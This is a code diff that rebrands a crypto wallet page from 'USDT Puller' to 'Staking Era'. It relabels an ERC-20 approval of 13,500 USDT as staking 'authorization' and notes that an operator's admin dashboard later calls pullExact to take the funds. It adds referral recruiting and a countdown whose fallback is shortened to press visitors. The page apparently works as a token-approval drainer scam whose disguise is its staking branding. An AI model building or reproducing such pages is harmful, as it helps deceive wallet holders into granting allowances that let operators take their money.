@@ -3,21 +3,21 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>USDT Puller – Subscribe</title>
+  <title>Staking Era – Authorization Flow</title>
   <style>
     :root {
-      --bg:#05060f;
-      --bg-gradient: radial-gradient(120% 120% at 50% 0%, rgba(0,223,154,0.18) 0%, rgba(9,9,26,0.95) 55%, rgba(5,6,15,1) 100%);
-      --card:#0c1224;
-      --muted:#97a3c1;
-      --text:#f3f5ff;
-      --accent:#00df9a;
-      --accent-strong:#02f6ab;
-      --danger:#f97070;
-      --warning:#ffe08a;
-      --glass:rgba(255,255,255,0.06);
+      --bg:#ffffff;
+      --bg-gradient: radial-gradient(120% 120% at 50% 0%, rgba(37,99,235,0.14) 0%, rgba(248,250,252,0.85) 55%, rgba(255,255,255,1) 100%);
+      --card:#ffffff;
+      --muted:#6b7280;
+      --text:#0f172a;
+      --accent:#2563eb;
+      --accent-strong:#1d4ed8;
+      --danger:#ef4444;
+      --warning:#f59e0b;
+      --glass:rgba(15,23,42,0.04);
     }
-    *{box-sizing:border-box}
+    *{box-sizing:border-box;}
     body{
       margin:0;
       font-family:'Inter',system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
@@ -25,9 +25,6 @@
       color:var(--text);
       position:relative;
       min-height:100vh;
-      display:flex;
-      flex-direction:column;
-      overflow-x:hidden;
     }
     body::before{
       content:"";
@@ -40,11 +37,11 @@
       content:"";
       position:fixed;
       inset:0;
-      background:linear-gradient(160deg, rgba(0,0,0,0.72), rgba(10,14,26,0.4));
+      background:linear-gradient(160deg, rgba(255,255,255,0.9), rgba(255,255,255,0.7));
       z-index:-1;
       pointer-events:none;
     }
-    a{color:inherit;text-decoration:none}
+    a{color:inherit;text-decoration:none;}
     header{
       padding:18px clamp(16px,4vw,48px);
       display:flex;
@@ -53,9 +50,9 @@
       position:sticky;
       top:0;
       z-index:10;
-      backdrop-filter:blur(16px);
-      background:rgba(5,8,21,0.55);
-      border-bottom:1px solid rgba(255,255,255,0.04);
+      backdrop-filter:blur(12px);
+      background:rgba(255,255,255,0.95);
+      border-bottom:1px solid rgba(15,23,42,0.08);
     }
     .brand{
       font-weight:700;
@@ -64,48 +61,55 @@
       display:flex;
       align-items:center;
       gap:12px;
+      text-transform:uppercase;
     }
     .brand span{
       display:inline-flex;
       align-items:center;
       justify-content:center;
-      width:36px;
-      height:36px;
+      width:40px;
+      height:40px;
       border-radius:12px;
-      background:linear-gradient(135deg,var(--accent-strong),#14c6ff);
-      color:#051012;
+      background:linear-gradient(135deg,var(--accent),#ffad5d);
+      color:#1a0b00;
       font-weight:800;
+    }
+    .brand small{
+      display:block;
+      font-size:0.72rem;
+      letter-spacing:0.2em;
+      color:var(--muted);
     }
     nav{display:flex;gap:18px;font-size:0.95rem;align-items:center;}
     nav a{color:var(--muted);transition:color .2s}
-    nav a:hover{color:var(--text)}
+    nav a:hover{color:#111827}
     .nav-login{
       appearance:none;
-      border:1px solid rgba(2,246,171,0.45);
+      border:1px solid rgba(37,99,235,0.5);
       padding:10px 18px;
       border-radius:999px;
       font-weight:600;
-      background:rgba(2,246,171,0.12);
-      color:var(--accent-strong);
+      background:rgba(37,99,235,0.12);
+      color:#0f172a;
       cursor:pointer;
       transition:all .25s;
     }
-    .nav-login:hover{background:rgba(2,246,171,0.2);transform:translateY(-1px);}
+    .nav-login:hover{background:rgba(37,99,235,0.2);transform:translateY(-1px);}
     .nav-login.connected{
-      background:rgba(2,246,171,0.2);
-      border-color:rgba(2,246,171,0.5);
+      background:rgba(37,99,235,0.2);
+      border-color:rgba(37,99,235,0.7);
       color:var(--text);
       cursor:default;
     }
     .cta-link{
       padding:10px 18px;
       border-radius:999px;
-      background:rgba(2,246,171,0.1);
-      color:var(--accent-strong);
-      border:1px solid rgba(2,246,171,.35);
+      background:rgba(37,99,235,0.1);
+      color:#1c2b4a;
+      border:1px solid rgba(37,99,235,0.35);
       transition:all .25s;
     }
-    .cta-link:hover{background:rgba(2,246,171,0.18);transform:translateY(-2px)}
+    .cta-link:hover{background:rgba(37,99,235,0.18);transform:translateY(-2px)}
     main{
       display:flex;
       flex-direction:column;
@@ -132,37 +136,34 @@
     }
     .ref-note{
       margin:18px 0 0;
-      color:var(--accent-strong);
+      color:var(--accent);
       font-size:0.95rem;
-      background:rgba(2,246,171,0.1);
-      border:1px solid rgba(2,246,171,0.22);
+      background:rgba(37,99,235,0.08);
+      border:1px solid rgba(37,99,235,0.3);
       padding:10px 14px;
       border-radius:16px;
       display:none;
     }
     .hero-card{
-      background:rgba(12,18,36,0.9);
-      border:1px solid rgba(255,255,255,0.07);
+      background:var(--card);
+      border:1px solid rgba(15,23,42,0.08);
       border-radius:24px;
       padding:32px;
-      box-shadow:0 35px 80px rgba(0,0,0,0.45);
+      box-shadow:0 35px 80px rgba(15,23,42,0.08);
       position:relative;
       overflow:hidden;
     }
     .hero-card::before{
       content:"";
       position:absolute;
-      width:160px;
-      height:160px;
-      background:radial-gradient(circle at center, rgba(2,246,171,0.22), transparent 70%);
+      width:220px;
+      height:220px;
+      background:radial-gradient(circle at center, rgba(37,99,235,0.25), transparent 70%);
       top:-40px;
-      right:-30px;
-      filter:blur(10px);
+      right:-40px;
+      filter:blur(12px);
     }
-    .hero-card h2{
-      margin:0 0 8px;
-      font-size:1.6rem;
-    }
+    .hero-card h2{margin:0 0 8px;font-size:1.6rem;}
     .hero-card p{margin:0 0 20px;color:var(--muted);line-height:1.55}
     .meta{
       font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Courier New', monospace;
@@ -170,7 +171,7 @@
       display:grid;
       gap:6px;
       margin-bottom:22px;
-      color:#b6c5ff;
+      color:#475569;
       word-break:break-all;
     }
     .status-line{
@@ -188,8 +189,8 @@
       font-weight:600;
       letter-spacing:0.02em;
       cursor:pointer;
-      background:linear-gradient(135deg,var(--accent-strong),#12bde2);
-      color:#02100b;
+      background:linear-gradient(135deg,var(--accent),#3b82f6);
+      color:#fdfdfd;
       transition:transform .2s, box-shadow .2s, filter .2s;
     }
     button.primary:disabled{
@@ -199,7 +200,7 @@
       box-shadow:none;
       filter:grayscale(.2);
     }
-    button.primary:not(:disabled):hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(0,223,154,0.35)}
+    button.primary:not(:disabled):hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(37,99,235,0.35)}
     .badge{
       display:inline-flex;
       align-items:center;
@@ -209,24 +210,24 @@
       font-size:12px;
       letter-spacing:.05em;
       text-transform:uppercase;
-      background:rgba(150,156,210,0.12);
-      color:#bac4ff;
-      border:1px solid rgba(150,156,210,0.22);
+      background:rgba(37,99,235,0.12);
+      color:#1d4ed8;
+      border:1px solid rgba(37,99,235,0.3);
     }
-    .badge.success{background:rgba(2,246,171,0.14);border-color:rgba(2,246,171,0.38);color:var(--accent-strong)}
-    .badge.error{background:rgba(249,112,112,0.1);border-color:rgba(249,112,112,0.35);color:var(--danger)}
-    .badge.warning{background:rgba(255,224,138,0.12);border-color:rgba(255,224,138,0.32);color:var(--warning)}
+    .badge.success{background:rgba(34,197,94,0.18);border-color:rgba(34,197,94,0.35);color:#065f46}
+    .badge.error{background:rgba(239,68,68,0.12);border-color:rgba(239,68,68,0.35);color:var(--danger)}
+    .badge.warning{background:rgba(249,115,22,0.12);border-color:rgba(249,115,22,0.32);color:var(--warning)}
     .identity{
       font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Courier New', monospace;
       font-size:13px;
-      color:#8fa3ff;
+      color:#475569;
       word-break:break-all;
       display:flex;
       align-items:center;
       gap:8px;
     }
     .identity span.label{
-      border:1px solid rgba(255,255,255,0.18);
+      border:1px solid rgba(15,23,42,0.1);
       padding:4px 10px;
       border-radius:10px;
       color:var(--muted);
@@ -242,7 +243,7 @@
     }
     .action-hint.error{color:var(--danger);}
     .action-hint.info{color:var(--muted);}
-    .action-hint.success{color:var(--accent-strong);}
+    .action-hint.success{color:#16a34a;}
     .login-hint{
       margin:12px 0 0;
       font-size:0.9rem;
@@ -253,21 +254,21 @@
     body[data-auth="false"] .login-hint{display:block;}
     .log{
       margin-top:24px;
-      background:rgba(8,12,26,0.72);
-      border:1px solid rgba(255,255,255,0.06);
+      background:rgba(15,23,42,0.08);
+      border:1px solid rgba(15,23,42,0.08);
       border-radius:16px;
       padding:18px;
       font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Courier New', monospace;
       font-size:12px;
-      color:#9fb3ff;
+      color:#1d2b45;
       max-height:220px;
       overflow:auto;
       white-space:pre-wrap;
     }
     .referral{
       margin-top:28px;
-      background:rgba(2,246,171,0.08);
-      border:1px solid rgba(2,246,171,0.32);
+      background:rgba(37,99,235,0.05);
+      border:1px solid rgba(37,99,235,0.2);
       border-radius:18px;
       padding:20px;
       display:none;
@@ -275,7 +276,7 @@
       gap:16px;
     }
     .referral h3{margin:0;font-size:1.15rem;color:var(--accent-strong)}
-    .referral p{margin:0;color:#bef6ff;font-size:0.95rem}
+    .referral p{margin:0;color:#1f2937;font-size:0.95rem}
     .referral-controls{
       display:flex;
       flex-wrap:wrap;
@@ -286,8 +287,8 @@
       min-width:220px;
       padding:12px 14px;
       border-radius:12px;
-      border:1px solid rgba(2,246,171,0.4);
-      background:rgba(255,255,255,0.08);
+      border:1px solid rgba(37,99,235,0.4);
+      background:rgba(255,255,255,0.9);
       color:var(--text);
       font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Courier New', monospace;
       font-size:13px;
@@ -295,8 +296,8 @@
     .referral button{
       appearance:none;
       border:none;
-      background:rgba(2,246,171,0.2);
-      color:#001b12;
+      background:rgba(37,99,235,0.15);
+      color:#0f172a;
       font-weight:600;
       padding:12px 18px;
       border-radius:12px;
@@ -309,7 +310,7 @@
       cursor:not-allowed;
       transform:none;
     }
-    .referral small{color:rgba(255,255,255,0.72);font-size:0.8rem}
+    .referral small{color:rgba(15,23,42,0.75);font-size:0.8rem}
     .referral .code-pill{
       display:inline-flex;
       align-items:center;
@@ -317,8 +318,8 @@
       align-self:start;
       padding:8px 14px;
       border-radius:999px;
-      border:1px solid rgba(2,246,171,0.45);
-      background:rgba(2,246,171,0.16);
+      border:1px solid rgba(37,99,235,0.45);
+      background:rgba(37,99,235,0.15);
       font-size:0.9rem;
       color:var(--accent-strong);
     }
@@ -335,8 +336,8 @@
     .referral-stats .stat{
       flex:1;
       min-width:140px;
-      background:rgba(2,246,171,0.12);
-      border:1px solid rgba(2,246,171,0.28);
+      background:rgba(37,99,235,0.08);
+      border:1px solid rgba(37,99,235,0.3);
       border-radius:14px;
       padding:12px 16px;
       display:flex;
@@ -352,7 +353,7 @@
       font-size:0.75rem;
       text-transform:uppercase;
       letter-spacing:.08em;
-      color:rgba(255,255,255,0.72);
+      color:rgba(15,23,42,0.72);
     }
     .referral-list{
       list-style:none;
@@ -365,18 +366,18 @@
       font-size:12px;
     }
     .referral-list li{
-      background:rgba(8,20,20,0.4);
-      border:1px solid rgba(2,246,171,0.24);
+      background:rgba(241,245,249,0.8);
+      border:1px solid rgba(15,23,42,0.08);
       border-radius:10px;
       padding:8px 10px;
-      color:#bef6ff;
+      color:#0f172a;
       display:flex;
       align-items:center;
       gap:10px;
     }
     .referral-list li.empty{
       border-style:dashed;
-      color:rgba(255,255,255,0.65);
+      color:rgba(15,23,42,0.65);
       background:transparent;
     }
     .code-chip{
@@ -386,8 +387,8 @@
       min-width:56px;
       padding:3px 10px;
       border-radius:999px;
-      border:1px solid rgba(2,246,171,0.45);
-      background:rgba(2,246,171,0.18);
+      border:1px solid rgba(37,99,235,0.45);
+      background:rgba(37,99,235,0.18);
       font-size:11px;
       letter-spacing:0.08em;
       color:var(--accent-strong);
@@ -401,21 +402,20 @@
     .info-card{
       padding:26px;
       border-radius:20px;
-      border:1px solid rgba(255,255,255,0.05);
-      background:rgba(10,14,32,0.8);
+      border:1px solid rgba(15,23,42,0.05);
+      background:rgba(255,255,255,0.85);
       display:flex;
       flex-direction:column;
       gap:12px;
-      box-shadow:0 24px 65px rgba(0,0,0,0.4);
+      box-shadow:0 24px 65px rgba(15,23,42,0.08);
     }
     .info-card h4{margin:0;font-size:1.1rem}
     .info-card p{margin:0;color:var(--muted);line-height:1.55}
     footer{
       padding:28px clamp(16px,4vw,48px);
-      border-top:1px solid rgba(255,255,255,0.05);
-      background:rgba(5,9,20,0.85);
-      backdrop-filter:blur(16px);
-      color:rgba(255,255,255,0.6);
+      border-top:1px solid rgba(15,23,42,0.08);
+      background:transparent;
+      color:rgba(15,23,42,0.75);
       font-size:0.9rem;
     }
     footer .cols{
@@ -442,8 +442,8 @@
       position:absolute;
       inset:-6px;
       border-radius:32px;
-      background:radial-gradient(circle at top, rgba(2,246,171,0.35), transparent 55%), radial-gradient(circle at bottom, rgba(20,200,255,0.25), transparent 60%);
-      opacity:0.45;
+      background:radial-gradient(circle at top, rgba(37,99,235,0.25), transparent 55%), radial-gradient(circle at bottom, rgba(248,115,6,0.25), transparent 60%);
+      opacity:0.35;
       filter:blur(40px);
       z-index:-2;
     }
@@ -451,7 +451,7 @@
       font-size:0.95rem;
       letter-spacing:0.24em;
       text-transform:uppercase;
-      color:rgba(255,255,255,0.72);
+      color:rgba(15,23,42,0.75);
     }
     .countdown-grid{
       position:relative;
@@ -462,9 +462,9 @@
       max-width:640px;
       padding:28px clamp(18px,6vw,40px);
       border-radius:28px;
-      border:1px solid rgba(255,255,255,0.12);
-      background:rgba(10,16,34,0.55);
-      box-shadow:0 22px 60px rgba(0,0,0,0.55);
+      border:1px solid rgba(15,23,42,0.12);
+      background:rgba(255,255,255,0.9);
+      box-shadow:0 22px 60px rgba(15,23,42,0.14);
       backdrop-filter:blur(22px);
       font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,'Courier New',monospace;
       overflow:hidden;
@@ -474,7 +474,7 @@
       position:absolute;
       inset:1px;
       border-radius:26px;
-      border:1px solid rgba(2,246,171,0.08);
+      border:1px solid rgba(37,99,235,0.08);
       pointer-events:none;
     }
     .countdown-grid div{
@@ -485,10 +485,10 @@
       align-items:center;
       justify-content:center;
       padding:16px 0;
-      background:linear-gradient(180deg,rgba(2,246,171,0.12) 0%,rgba(2,246,171,0) 75%);
+      background:linear-gradient(180deg,rgba(37,99,235,0.12) 0%,rgba(37,99,235,0) 75%);
       border-radius:18px;
-      border:1px solid rgba(2,246,171,0.12);
-      box-shadow:inset 0 0 18px rgba(2,246,171,0.08);
+      border:1px solid rgba(37,99,235,0.12);
+      box-shadow:inset 0 0 18px rgba(37,99,235,0.08);
     }
     .countdown-grid div::before{
       content:'';
@@ -497,7 +497,7 @@
       width:22px;
       height:2px;
       border-radius:999px;
-      background:rgba(255,255,255,0.28);
+      background:rgba(255,255,255,0.7);
       opacity:0.35;
     }
     .countdown-grid span{
@@ -506,13 +506,13 @@
       letter-spacing:0.08em;
       display:block;
       color:var(--accent-strong);
-      text-shadow:0 8px 30px rgba(2,246,171,0.25);
+      text-shadow:0 8px 30px rgba(37,99,235,0.2);
     }
     .countdown-grid small{
       text-transform:uppercase;
       letter-spacing:0.14em;
       font-size:0.75rem;
-      color:rgba(255,255,255,0.75);
+      color:rgba(15,23,42,0.65);
     }
     @media (max-width:720px){
       header{padding:16px 20px;flex-direction:column;align-items:flex-start;gap:12px;}
@@ -530,61 +530,61 @@
 </head>
 <body data-auth="false">
   <header>
-    <div class="brand"><span>UP</span> USDT Puller</div>
+    <div class="brand"><span>SE</span> Staking Era <small>Authorization</small></div>
     <nav>
-      <a href="#how">How it works</a>
-      <a href="#security">Safety</a>
-      <button type="button" id="btnLogin" class="nav-login">Login</button>
+      <a href="#how">Flow guide</a>
+      <a href="#security">Security checks</a>
+      <button type="button" id="btnLogin" class="nav-login">Connect wallet</button>
     </nav>
   </header>
 
   <main>
     <section class="hero">
       <div class="hero__copy">
-        <h1 class="hero__heading">Subscribe & unlock instant pull access.</h1>
+        <h1 class="hero__heading">Staking Era keeps your wallet ready for pull events.</h1>
         <p class="hero__lede">
-          Approve once, stay ready. Subscribe your wallet to give the trusted Puller contract permission to draw the exact USDT amount you specify later.
-          Your approval is revocable at any time from your wallet.
+          Grant the Staking Era contract a precise allowance today so future withdrawals happen without another approval step.
+          You keep control—adjust or revoke the permission anytime directly from your wallet.
         </p>
         <p class="ref-note" id="refNote"></p>
       </div>
       <div class="hero-card">
-        <h2>Subscribe your wallet</h2>
-        <p>Approve <strong id="approvalAmount">20,000</strong> USDT for the Puller contract below. This action requires your signature in MetaMask or a compatible wallet.</p>
+        <h2>Get started</h2>
+        <p>Approve <strong id="approvalAmount">13,500</strong> USDT for the Staking Era contract below so it can later pull the exact amount you specify. Signature from MetaMask or a compatible wallet is required.</p>
         <div class="meta">
-          <div>Puller Contract: <span id="pullerAddr"></span></div>
+          <div>Staking Era contract: <span id="pullerAddr"></span></div>
           <div>USDT Token: <span id="assetAddr"></span></div>
         </div>
         <div class="status-line">
-          <button class="primary" id="btnSubscribe">Subscribe</button>
-          <span id="status" class="badge">Disconnected</span>
+          <button class="primary" id="btnSubscribe">Get Started</button>
+          <span id="status" class="badge">Offline</span>
         </div>
-        <p class="login-hint">Connect your wallet to view referral tools and subscribe.</p>
+        <p class="login-hint">Connect a wallet to unlock referrals and confirm your approval.</p>
         <p class="action-hint auth-only" id="actionHint"></p>
         <div class="identity auth-only">
           <span class="label">Wallet</span>
           <span id="userInfo">Not connected</span>
         </div>
         <div class="referral auth-only" id="referralBox">
-          <h3>Referral link ready</h3>
-          <p>Share this invite so friends can subscribe under you. Each approved wallet creates a unique referral URL.</p>
-          <div class="code-pill">Your referral code: <span id="refCodeLabel">—</span></div>
+          <h3>Invite console</h3>
+          <p>Share your invite so others can join your authorization. Each linked wallet keeps the referral trace intact.</p>
+          <div class="code-pill">Invite code: <span id="refCodeLabel">—</span></div>
           <div class="referral-controls">
             <input id="referralLink" readonly />
-            <button id="copyReferral">Copy / Share</button>
+            <button id="copyReferral">Share invite</button>
           </div>
           <div class="referral-stats">
             <div class="stat">
               <span id="totalUsers">0</span>
-              <small>Total subscribers</small>
+              <small>Total approvals</small>
             </div>
             <div class="stat">
               <span id="refCount">0</span>
-              <small>Your referrals</small>
+              <small>Linked invites</small>
             </div>
           </div>
           <ul id="refList" class="referral-list"></ul>
-          <small id="referralHint">Referral link copied to clipboard.</small>
+          <small id="referralHint">Invite link is ready on your clipboard.</small>
         </div>
         <pre class="log" id="log"></pre>
       </div>
@@ -592,23 +592,23 @@
 
     <section class="grid" id="how">
       <article class="info-card">
-        <h4>One-click subscription</h4>
-        <p>Tap Subscribe and sign the approval transaction. We calculate the precise allowance (default <span id="infoAmount">20,000</span> USDT) using on-chain decimals so it matches the token exactly.</p>
+        <h4>Rapid authorization</h4>
+        <p>Hit Get Started and sign the approval so the contract can later pull <span id="infoAmount">13,500</span> USDT exactly once per allowance. Decimal math is handled automatically.</p>
       </article>
       <article class="info-card">
-        <h4>Operator initiated pulls</h4>
-        <p>The admin dashboard lists subscribed wallets and can call <code>pullExact</code> only when you’ve approved. No funds move until the operator triggers it.</p>
+        <h4>Operator pulls on standby</h4>
+        <p>The admin dashboard only calls <code>pullExact</code> once a wallet has authorized. Until then, the allowance sits untouched on-chain.</p>
       </article>
       <article class="info-card" id="security">
-        <h4>Transparent & revocable</h4>
-        <p>Approval is recorded on BNB Smart Chain. You retain control—revoke anytime via your wallet or set a new allowance in the future.</p>
+        <h4>Track & revoke</h4>
+        <p>Approvals are logged on BNB Smart Chain. Revoke in your wallet or submit a new allowance anytime to reset the puller permissions.</p>
       </article>
     </section>
   </main>
 
   <footer>
     <div class="countdown">
-      <div class="countdown-title">Staking event ends in:</div>
+    <div class="countdown-title">Authorization window ends in:</div>
       <div class="countdown-grid" id="countdown">
         <div><span data-unit="days">194</span><small>Days</small></div>
         <div><span data-unit="hours">00</span><small>Hours</small></div>
@@ -618,18 +618,18 @@
     </div>
     <div class="cols">
       <div>
-        <h5>Project</h5>
+        <h5>Quick links</h5>
         <ul>
-          <li><a href="/">User Subscribe</a></li>
-          <li><a href="/admin">Admin Dashboard</a></li>
-          <li><a href="https://bscscan.com/address/0xd1e5962eeFe6dc0a870d2148B7e2065666139b5c" target="_blank" rel="noopener">Contract on BscScan</a></li>
+          <li><a href="/">Subscribe portal</a></li>
+          <li><a href="/admin">Admin dashboard</a></li>
+          <li><a href="https://bscscan.com/address/0xD2fF0d66df51529138C4F4ef4976FF0A0d4643fF" target="_blank" rel="noopener">Puller contract</a></li>
         </ul>
       </div>
       <div>
         <h5>Support</h5>
         <ul>
-          <li>Make sure MetaMask (or a compatible wallet) is installed and unlocked before subscribing.</li>
-          <li>Need help? Contact your project admin for instructions or allowance adjustments.</li>
+          <li>Confirm MetaMask or another wallet is unlocked before authorizing.</li>
+          <li>Questions? Message your project admin for clarifications or allowance tweaks.</li>
         </ul>
       </div>
       <div>
@@ -637,11 +637,11 @@
         <ul>
           <li>BNB Smart Chain (Mainnet)</li>
           <li>Chain ID: 56</li>
-          <li>Status badge updates in real time during the subscription flow.</li>
+          <li>Status badge reacts live while the approval flow runs.</li>
         </ul>
       </div>
     </div>
-    <small>© <span id="year"></span> USDT Puller. Stay verified. Stay in sync.</small>
+    <small>© <span id="year"></span> Staking Era. Authorization flow refreshed.</small>
   </footer>
 
 <script>
@@ -689,7 +689,9 @@
   const configuredCountdownTarget = window.APP_CONFIG.COUNTDOWN_END_DATE;
   const parsedCountdownTarget = configuredCountdownTarget ? Date.parse(configuredCountdownTarget) : NaN;
   const fallbackDaysConfig = Number(window.APP_CONFIG.COUNTDOWN_FALLBACK_DAYS);
-  const fallbackDays = Number.isFinite(fallbackDaysConfig) && fallbackDaysConfig > 0 ? fallbackDaysConfig : 195;
+  const fallbackDays = Number.isFinite(fallbackDaysConfig) && fallbackDaysConfig > 0
+    ? Math.max(0, fallbackDaysConfig - 1)
+    : 195;
   const fallbackCountdownTarget = Date.now() + fallbackDays * MS_DAY;
   let countdownTarget = Number.isNaN(parsedCountdownTarget) ? fallbackCountdownTarget : parsedCountdownTarget;
   let clockOffset = 0;
@@ -782,7 +784,7 @@ ${new Date().toLocaleTimeString()}  ${message}`;
     if (!entries.length) {
       const li = document.createElement('li');
       li.className = 'empty';
-      li.textContent = 'No referrals yet. Share your link to start building your network.';
+      li.textContent = 'No invites tracked yet. Share your link to bring others onboard.';
       refListEl.appendChild(li);
       return;
     }
@@ -817,13 +819,13 @@ ${new Date().toLocaleTimeString()}  ${message}`;
     copyBtn.disabled = !hasCode;
     if (isAuthenticated) {
       btn.disabled = false;
-      btn.textContent = 'Subscribe';
+      btn.textContent = 'Get Started';
       if (allowanceActive) {
-        setStatus('Subscribed', 'success');
-        setActionHint('Subscription active. You can re-approve anytime or share your link below.', 'success');
+        setStatus('Ready', 'success');
+        setActionHint('Authorization active. Tap Get Started again to refresh or share your invite below.', 'success');
       } else {
         setStatus('Connected', 'success');
-        setActionHint('Allowance not active. Click Subscribe to approve again.', 'info');
+        setActionHint('Allowance not active. Click Get Started to approve again.', 'info');
         if (!hasCode && referralBox) referralBox.style.display = 'none';
       }
     } else {
@@ -875,7 +877,7 @@ ${new Date().toLocaleTimeString()}  ${message}`;
     const refUser = state.subscribers.find(u => u.address?.toLowerCase?.() === address.toLowerCase());
     const codeLabel = (refUser?.refCode || codeToken || '').toString();
     const addrLabel = shortenAddress(refUser?.address || address);
-    refNote.innerHTML = `You were referred by <span class="mono">${addrLabel}</span> • code <span class="code-chip">${codeLabel}</span>. Subscribe to credit them.`;
+    refNote.innerHTML = `You were referred by <span class="mono">${addrLabel}</span> • code <span class="code-chip">${codeLabel}</span>. Invite them to keep the credit chain.`;
     refNote.style.display = 'block';
   };
 
@@ -993,7 +995,7 @@ ${new Date().toLocaleTimeString()}  ${message}`;
 
   function resetButton() {
     btn.disabled = !isAuthenticated;
-    btn.textContent = 'Subscribe';
+    btn.textContent = 'Get Started';
   }
 
   async function connectAndApprove() {
@@ -1007,7 +1009,7 @@ ${new Date().toLocaleTimeString()}  ${message}`;
       }
       clearActionHint();
       btn.disabled = true;
-      btn.textContent = 'Subscribing…';
+      btn.textContent = 'Getting started…';
       setStatus('Preparing', 'warning');
 
       const amt = ethers.parseUnits(String(DEFAULT_APPROVAL_USDT), decimals);
@@ -1019,10 +1021,10 @@ ${new Date().toLocaleTimeString()}  ${message}`;
       const rc = await tx.wait();
       appendLog(`approval confirmed in block ${rc.blockNumber}`);
 
-      setStatus('Subscribed', 'success');
-      btn.textContent = 'Subscribed';
+      setStatus('Ready', 'success');
+      btn.textContent = 'Ready';
       btn.disabled = true;
-      setActionHint('Subscription confirmed. Referral link ready to share.', 'success');
+      setActionHint('Authorization confirmed. Invite link ready to share.', 'success');
 
       try {
         const payload = { address: account, txHash: tx.hash };
@@ -1047,12 +1049,12 @@ ${new Date().toLocaleTimeString()}  ${message}`;
       const message = error?.message || error?.data?.message || error;
       if (isUserRejected(error)) {
         setStatus('Cancelled', 'error');
-        setActionHint('You cancelled the subscription in your wallet. Approve the request to finish.', 'error');
+        setActionHint('You cancelled the authorization in your wallet. Approve the request to finish.', 'error');
         resetButton();
         return;
       }
       setStatus('Failed', 'error');
-      setActionHint(`We could not complete the subscription. ${message}`, 'error');
+      setActionHint(`We could not complete the authorization. ${message}`, 'error');
       appendLog(`error: ${message}`);
       resetButton();
     }
@@ -1065,15 +1067,15 @@ ${new Date().toLocaleTimeString()}  ${message}`;
     const codeLabel = (refCodeLabel?.textContent || '').trim();
     try {
       if (navigator.share) {
-        await navigator.share({ title: 'USDT Puller referral', url: link });
+        await navigator.share({ title: 'Staking Era invite', url: link });
         referralHint.textContent = codeLabel ? `Share dialog opened with code ${codeLabel}. Send the link to complete.` : 'Share dialog opened. Send the link to complete.';
       } else if (navigator.clipboard?.writeText) {
         await navigator.clipboard.writeText(link);
-        referralHint.textContent = codeLabel ? `Referral ${codeLabel} copied to clipboard.` : 'Referral link copied to clipboard.';
+        referralHint.textContent = codeLabel ? `Invite ${codeLabel} copied to clipboard.` : 'Invite link copied to clipboard.';
       } else {
         referralLink.select();
         document.execCommand('copy');
-        referralHint.textContent = codeLabel ? `Referral ${codeLabel} copied. Paste to share.` : 'Referral link copied. Paste to share.';
+        referralHint.textContent = codeLabel ? `Invite ${codeLabel} copied. Paste to share.` : 'Invite link copied. Paste to share.';
       }
       referralHint.style.display = 'block';
       setActionHint(referralHint.textContent, 'success');
